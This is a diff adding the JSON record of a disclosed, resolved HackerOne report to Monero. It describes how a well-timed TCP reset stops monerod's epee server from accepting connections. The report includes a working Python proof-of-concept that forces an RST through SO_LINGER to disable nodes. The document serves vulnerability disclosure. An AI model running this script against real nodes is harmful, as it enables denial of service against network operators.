@@ -1,0 +1,113 @@
+{
+  "id": 363714,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM3MTQ=",
+  "url": "https://hackerone.com/reports/363714",
+  "title": "monerod can be disabled by a well-timed TCP reset packet",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-06-09T12:09:17.963Z",
+  "submitted_at": "2018-06-09T12:09:17.963Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ahook",
+    "url": "/ahook",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-08-02T00:12:35.066Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-07-27T10:34:01.328Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nA well-timed TCP reset (RST) can cause monerod (or any service relying on epee) to stop accepting new connections.\n\n**Description:**\nWhen a new connection is attempted, the handle_accept function is called. This does some error checking and finishes setting up the connection. Once the connection is set up, it calls acceptor_.async_accept() in order to continue listening for new connections.\n\nhttps://github.com/monero-project/monero/blob/8a7b3ff13858c5d879530c99de5c723c88429342/contrib/epee/include/net/abstract_tcp_server2.inl#L982\n\nHowever, if the handle_accept function is called with an error code, it bypasses the main block of code and simply logs a message. It does not add the accept handler back to the acceptor. The result is that the daemon will stop accepting new connections if an error is hit.\n\nIt is possible for an attacker to remotely trigger such an error. If a TCP RST packet is sent immediately after a successful TCP handshake, the connection/socket will be torn down. If it happens fast enough (specifically in the window between the server receiving the ACK and the handle_accept function being called), this will cause an error.\n\n## Releases Affected:\n\nAll releases using epee.\n\n## Steps To Reproduce:\n\nI've included a python script below which demonstrates a normal TCP connection that ends gracefully, and a malicious connection which causes an RST to be sent at close as opposed to FIN.\n\nIf this is run on a relatively idle node (e.g. if it's still synchronizing its blockchain), it will disable the node after just a couple tries. If a node is fully active, it becomes harder to get the RST processed within the critical window. I have yet to disable a fully active node, but it should be possible. A more efficient/faster attack going over raw sockets might make it easier.\n\n## Supporting Material/References:\n\n$ ./rst-attack.py <ip> <port>\n```\n#!/usr/bin/env python3\n  \nimport socket, struct, sys\n\ntgt_host = sys.argv[1]\ntgt_port = int(sys.argv[2])\n\n# Normal connection, send some data, end with graceful FIN.\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)\ns.connect((tgt_host, tgt_port))\ns.send(b\"hello\")\ns.close()\n\n# Abnormal connection, force close by RST instead of FIN.\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)\nl_onoff = 1\nl_linger = 0\np=struct.pack('ii', l_onoff, l_linger)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, p)\ns.connect((tgt_host, tgt_port))\ns.close()\n```\n\n## Impact\n\nAn attacker can remotely disable monero nodes. I marked this as medium since my proof-of-concept script fails to disable most active nodes. However, it is theoretically possible to take down the whole network if a clever variation or different means of causing an accept error is discovered.\n\nAn attacker could also monitor the network and snipe any nodes that have lagged behind or are in the middle of syncing the chain.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-08-26T10:34:01.467Z",
+  "allow_singular_disclosure_after": -242467031.19851494,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "n1m0",
+    "cryptographer",
+    "apehex",
+    "71ck5"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
